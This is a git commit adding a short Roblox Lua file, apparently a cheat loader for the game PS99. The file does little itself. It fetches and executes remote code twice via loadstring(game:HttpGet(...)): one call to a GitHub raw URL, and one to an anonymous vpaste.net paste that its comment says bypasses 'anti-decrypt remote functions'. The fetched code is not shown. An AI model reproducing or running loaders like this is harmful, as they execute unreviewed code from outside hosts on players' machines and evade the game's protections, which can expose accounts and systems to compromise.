1ce0efd2982f300ae41a5f45fcff4677806093b3
Verteniastyy <marvnesterwhahaha@gmail.com>
2025-04-10 17:09:31 +0800

    Add files via upload

---
+++ chestboostv2.lua
@@ -0,0 +1,13 @@
+if not game:IsLoaded() then
+    while not game:IsLoaded() do wait(1) end
+end
+wait(0.5)
+
+-- Main Slime Event Script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Verteniastyy/PS99/refs/heads/main/chest_boost.lua", true))()
+
+-- This script is used to bypass anti-decrypt remote functions
+loadstring(game:HttpGet("http://vpaste.net/ek3oU", true))()
+
+
+
